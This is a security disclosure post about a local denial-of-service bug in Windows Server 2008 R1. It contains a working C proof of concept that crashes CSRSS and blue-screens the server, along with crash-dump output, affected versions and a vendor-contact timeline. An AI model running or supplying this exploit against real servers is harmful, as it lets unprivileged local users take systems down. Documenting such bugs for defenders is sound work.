@@ -1,0 +1,113 @@
+Hi all.
+Here's a cute little local DoS attack against Windows Server 2008 R1,
+which will allow any user who can execute unprivileged code to BSoD
+your server with about three lines of C.
+I have reported this to Microsoft, but because of the limited scope of
+the issue - DoS-only, and server 2008 R1, as opposed to R2 - they
+declined to put out a security bulletin. Note that, as far as I can
+tell, upgrades from R1 to R2 are for-pay unless you bought R1 with
+Software Assurance originally, and additionally, that R2 does not
+support 32-bit hardware.
+
+I originally informed the vendor ten months ago, and their response
+was that, due to the DoS-only and R1-only circumstance, this problem
+"would be a candidate for inclusion in a future service pack update
+should one be released on the affected platforms". Perhaps naively, I
+then expected this to be fixed via a service pack, which has not
+transpired since then. Since the issue is so straightforward to
+reproduce (I refuse to believe that no-one else has found this), I
+have decided to disclose the issue publically in order to assist and
+remaining owners of 2008 R1 in securing their boxes.
+
+The best way to explain the issue is with an example exploit:
+
+int main(int argc, char *argv[])
+{
+    DWORD foo;
+    char stuff[10];
+
+    CloseHandle(GetStdHandle(STD_OUTPUT_HANDLE ));
+    CloseHandle(GetStdHandle(STD_ERROR_HANDLE ));
+
+    ReadConsole(GetStdHandle( STD_INPUT_HANDLE ), stuff, 5, &foo, NULL);
+}
+
+Kapow - it's that simple. Close stdout and stderr, and read from
+stdin. Any of the other functions which do this can be used (cygwin,
+for example, can be used with it's standard C calls which eventually
+call CloseHandle). Anyway, if you run that on a server 2008 R1 box you
+will bluescreen! Further investigaion reveals a null deref in CSRSS:
+
+ *** An Access Violation occurred in C:\Windows\system32\csrss.exe
+ ..
+ The instruction at 756DB6A1 tried to write to an invalid address, 0000000C
+
+ eax=015c0da8 ebx=00000000 ecx=00000000 edx=015c14a8 esi=00000000 edi=015c0dc8
+ eip=756db6a1 esp=0083f5d0 ebp=0083f6a0 iopl=0         nv up ei pl zr
+ na pe nc cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000 efl=00010246
+
+ WARNING: Process directory table base 1F187040 doesn't match CR3
+ 1F187360
+ 001b:756db6a1 ff460c          inc     dword ptr [esi+0Ch]
+ds:0023:0000000c=????????
+
+ 756db6a1 ff460c          inc     dword ptr [esi+0Ch]
+ 756db6a4 8b8d54ffffff    mov     ecx,dword ptr [ebp-0ACh]
+ 756db6aa 898570ffffff    mov     dword ptr [ebp-90h],eax
+ 756db6b0 8a8059010000    mov     al,byte ptr [eax+159h]
+ 756db6b6 8845b3          mov     byte ptr [ebp-4Dh],al
+ 756db6b9 8a471c          mov     al,byte ptr [edi+1Ch]
+ 756db6bc 66834da4ff      or      word ptr [ebp-5Ch],0FFFFh
+ 756db6c1 66834da6ff      or      word ptr [ebp-5Ah],0FFFFh
+
+ ChildEBP RetAddr  Args to Child
+ 0083f6a0 756dbd5e 015c0dc8 015c0da8 002a0058 winsrv!ReadChars+0x3c2
+ 0083f6f8 757359e4 015c0da8 0083f80c 945f0621 winsrv!SrvReadConsole+0x102
+ 0083f86c 76f77ca3 00000000 7781fc7b 00000000 CSRSRV!CsrApiRequestThread+0x3b1
+ 0083f8ac 76f9e489 75735633 00000000 ffffffff ntdll!__RtlUserThreadStart+0x35
+ 0083f8c4 00000000 75735633 00000000 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+Sample bugcheck output:
+
+*** STOP: 0x000000F4 (0x00000003, 0x84B92020, 0x84B9216C, 0x81C71A60)
+
+Confirmed vulnerable:
+
+* Windows server 2008 r1
+
+Confirmed not vulnerable (some by MS, some by me):
+
+* Server 2008 r2
+* Windows 7
+* XP, 2003, 2003 r2
+* Pretty much all the other MS OS's.
+
+Mitigation:
+
+I have no idea. If your environment allows it, do not enable users to
+run any user-supplied code (although if that's possible, then you've
+probably already taken steps to prevent this). Alternatively, upgrade
+to R2 (or, indeed, anything other that 2008 R1) if possible. If you
+are annoyed that this circumstance requires an upgrade, shout at MS.
+
+Microsoft supplied the following when asked if they were aware of any
+mitigations:
+"An attacker must have valid logon credentials and be able to log on
+locally to exploit this vulnerability. The vulnerability could not be
+exploited remotely or by anonymous users."
+
+
+Timeline:
+
+* July 15, 2010 : Contacted vendor
+* July 15, 2010 : Got initial vendor response, assured that a named
+staff member would contact me
+* October 26, 2010 : Emailed vendor asking for a status update
+* October 26, 2010 : Got vendor response, apologies for delay
+* October 26, 2010 to November 2, 2010 : Some discussion, culminating
+with the vendor's decision that no bulletin would be issued but maybe
+a service pack someday
+* September 3, 2011 : Some time has passed without a patch; emailed
+vendor asking for update
+* September 6, 2011 : Vendor responds by reiterating their previous position
+* September 6, 2011 : Public disclosure
